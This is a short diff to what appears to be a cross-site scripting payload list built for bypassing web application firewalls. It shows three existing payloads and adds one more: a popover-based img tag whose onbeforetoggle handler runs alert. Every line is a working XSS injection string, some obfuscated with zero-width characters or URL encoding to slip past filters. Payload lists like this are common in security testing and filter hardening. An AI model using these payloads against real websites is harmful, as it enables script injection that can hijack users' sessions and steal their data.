@@ -1,3 +1,4 @@
 "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
 <img/src/onerror​=alert&#xFEFF;(1)>
 6'%22()%26%25%22%3E%3Csvg/onload​=prompt(document.domain)%3E/
+<button popovertarget=x>Click me</button><img onbeforetoggle​=alert('Sanchit_tiwari') popover id=x>XSS
